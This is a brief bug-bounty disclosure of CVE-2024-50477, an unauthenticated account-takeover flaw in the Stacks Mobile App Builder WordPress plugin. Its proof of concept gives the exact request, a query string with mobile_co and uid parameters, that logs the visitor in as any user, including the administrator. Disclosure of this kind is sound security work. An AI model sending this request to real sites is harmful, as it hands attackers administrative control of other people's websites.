# Post Report Info

- Link: https://patchstack.com/database/vulnerability/stacks-mobile-app-builder/wordpress-stacks-mobile-app-builder-plugin-5-2-3-account-takeover-vulnerability
- CVE: 2024-50477
- Bounty: 58.8 AXP

The Stacks Mobile App Builder – The most powerful Mobile Applications Drag and Drop builder plugin is vulnerable to an unauthenticated privilege escalation giving an attacker the ability to login as any WordPress user.

## Affected Plugin

Link: https://wordpress.org/plugins/stacks-mobile-app-builder/

## Proof of Concept

1. Install and activate this plugin
2. Navigate to the following URL to become the USER with id = 1

```
/?mobile_co=1&uid=1
```

3. Congrats on your new admin powers.
    


    